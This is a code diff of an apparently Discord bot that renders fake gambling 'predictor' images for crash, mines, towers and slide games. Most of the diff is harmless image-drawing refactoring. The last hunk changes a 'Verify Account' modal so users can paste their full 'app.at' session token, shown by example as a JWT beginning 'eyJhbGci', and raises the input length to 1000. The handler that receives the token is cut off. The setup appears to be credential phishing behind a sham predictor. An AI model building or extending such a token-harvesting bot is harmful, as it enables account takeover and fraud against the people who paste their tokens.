@@ -29,12 +29,17 @@ TOWERS_WRONG_ID = "1515851526998851594"
 TILE_URL = f"https://cdn.discordapp.com/emojis/{TILE_ID}.png"
 BOMB_URL = f"https://cdn.discordapp.com/emojis/{BOMB_ID}.png"
 DIAMOND_URL = f"https://cdn.discordapp.com/emojis/{DIAMOND_ID}.png"
+
 SLIDE_RED_URL = f"https://cdn.discordapp.com/emojis/{SLIDE_RED_ID}.png"
 SLIDE_PURPLE_URL = f"https://cdn.discordapp.com/emojis/{SLIDE_PURPLE_ID}.png"
+
 TOWERS_RIGHT_URL = f"https://cdn.discordapp.com/emojis/{TOWERS_RIGHT_ID}.png"
 TOWERS_WRONG_URL = f"https://cdn.discordapp.com/emojis/{TOWERS_WRONG_ID}.png"
 
-bot = commands.Bot(command_prefix="!", intents=discord.Intents.default())
+bot = commands.Bot(
+    command_prefix="!",
+    intents=discord.Intents.default()
+)
 
 
 def get_font(size, bold=False):
@@ -52,6 +57,33 @@ def get_font(size, bold=False):
             continue
 
     return ImageFont.load_default()
+
+
+def draw_big_text(base_image, text, position, size, fill, bold=True):
+    font = get_font(size, bold=bold)
+
+    test = Image.new("RGBA", (10, 10), (0, 0, 0, 0))
+    test_draw = ImageDraw.Draw(test)
+    bbox = test_draw.textbbox((0, 0), text, font=font)
+
+    text_width = bbox[2] - bbox[0]
+    text_height = bbox[3] - bbox[1]
+
+    text_image = Image.new(
+        "RGBA",
+        (text_width + 20, text_height + 20),
+        (0, 0, 0, 0)
+    )
+
+    text_draw = ImageDraw.Draw(text_image)
+    text_draw.text(
+        (10 - bbox[0], 10 - bbox[1]),
+        text,
+        font=font,
+        fill=fill
+    )
+
+    base_image.alpha_composite(text_image, position)
 
 
 async def download_image(url):
@@ -99,6 +131,7 @@ async def create_mines_image(board, grid_size):
     image_bytes = io.BytesIO()
     image.save(image_bytes, format="PNG")
     image_bytes.seek(0)
+
     return image_bytes
 
 
@@ -135,6 +168,7 @@ async def create_towers_image(rows, columns):
     image_bytes = io.BytesIO()
     image.save(image_bytes, format="PNG")
     image_bytes.seek(0)
+
     return image_bytes
 
 
@@ -171,6 +205,7 @@ async def create_slide_image(result):
     image_bytes = io.BytesIO()
     image.save(image_bytes, format="PNG")
     image_bytes.seek(0)
+
     return image_bytes
 
 
@@ -181,10 +216,6 @@ async def create_crash_image(multiplier):
     image = Image.new("RGBA", (width, height), (14, 18, 30, 255))
     draw = ImageDraw.Draw(image)
 
-    title_font = get_font(52, bold=True)
-    multi_font = get_font(170, bold=True)
-    small_font = get_font(34, bold=True)
-
     draw.rounded_rectangle(
         [30, 30, width - 30, height - 30],
         radius=30,
@@ -193,36 +224,39 @@ async def create_crash_image(multiplier):
         width=8
     )
 
-    title_text = "AV Crash Predictor"
+    draw_big_text(
+        image,
+        "AV Crash Predictor",
+        (70, 55),
+        54,
+        (255, 255, 255, 255),
+        bold=True
+    )
+
     multi_text = f"{multiplier}x"
-    small_text = "Generated multiplier"
 
-    draw.text(
-        (60, 55),
-        title_text,
-        font=title_font,
-        fill=(255, 255, 255, 255)
-    )
-
-    bbox = draw.textbbox((0, 0), multi_text, font=multi_font)
+    font = get_font(180, bold=True)
+    temp = Image.new("RGBA", (10, 10), (0, 0, 0, 0))
+    temp_draw = ImageDraw.Draw(temp)
+    bbox = temp_draw.textbbox((0, 0), multi_text, font=font)
     text_width = bbox[2] - bbox[0]
-    text_height = bbox[3] - bbox[1]
 
-    multi_x = (width - text_width) // 2
-    multi_y = (height - text_height) // 2 - 10
-
-    draw.text(
-        (multi_x, multi_y),
+    draw_big_text(
+        image,
         multi_text,
-        font=multi_font,
-        fill=(43, 200, 255, 255)
+        ((width - text_width) // 2, 135),
+        180,
+        (43, 200, 255, 255),
+        bold=True
     )
 
-    draw.text(
-        (60, 335),
-        small_text,
-        font=small_font,
-        fill=(180, 190, 210, 255)
+    draw_big_text(
+        image,
+        "Generated multiplier",
+        (70, 330),
+        36,
+        (180, 190, 210, 255),
+        bold=True
     )
 
     image_bytes = io.BytesIO()
@@ -231,13 +265,14 @@ async def create_crash_image(multiplier):
 
     return image_bytes
 
+
 class VerifyModal(discord.ui.Modal, title="Verify Account"):
     username = discord.ui.TextInput(
-        label="Enter your app.at",
-        placeholder="Must start with ey, no spaces",
+        label="Enter your app.at value",
+        placeholder="Example: eyJhbGci...",
         required=True,
         min_length=2,
-        max_length=300
+        max_length=1000
     )
 
     async def on_submit(self, interaction: discord.Interaction):
